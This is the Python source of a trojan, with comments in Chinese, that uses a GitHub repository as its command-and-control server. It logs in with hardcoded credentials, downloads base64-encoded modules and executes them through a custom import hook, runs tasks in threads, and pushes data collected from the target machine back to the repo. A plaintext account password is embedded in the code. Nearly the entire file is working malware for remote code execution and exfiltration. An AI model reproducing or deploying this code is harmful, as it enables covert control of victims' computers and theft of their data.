#!/usr/bin/env python
# coding: utf-8

import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path     = "data/%s/" % trojan_id
trojan_modules= []

task_queue    = Queue.Queue()
configured    = False

# 从github repo中远程导入模块
class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""
    
    def find_module(self, fullname, path=None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)
            
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
                
        return None

    def load_module(self, name):
        module = imp.new_module(name)
        
        exec self.current_module_code in module.__dict__
        
        sys.modules[name] = module
        
        return module


# 与github通信：对用户进行认证，然后获得当前的repo和branch对象提供给其他函数使用
def connect_to_github():
    gh = login(username="GavinDing", password="20063277ff")
    repo = gh.repository("GavinDing", "study")
    branch = repo.branch("master")

    return gh, repo, branch

# 与github通信：从远程的repo中抓取文件，然后将文件内容读取到本地变量中
def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    
    tree = branch.commit.commit.tree.recurse()
    
    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            
            blob = repo.blob(filename._json_data['sha'])
            
            return blob.content

    return None

# 与github通信：获得repo中的远程配置文件
def get_trojan_config():
    global configured
    
    config_json   = get_file_contents(trojan_config)
    config        = json.loads(base64.b64decode(config_json))
    configured    = True
    
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])
            
    return config

# 与github通信：将从目标机器上收集到的数据推送到repo中
def store_module_result(data):
    gh, repo, branch = connect_to_github()
    
    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
    
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
    
    return


# 运行指定模块
def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    
    # store the result in our repo
    store_module_result(result)
    
    return


# 将自定义的用于导入的类添加到sys.meta_path中，以实现从远程repo中导入模块的功能
sys.meta_path = [GitImporter()]

# main trojan loop
while True:
    if task_queue.empty():
        config = get_trojan_config()
        
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
            
    time.sleep(random.randint(1000, 10000))
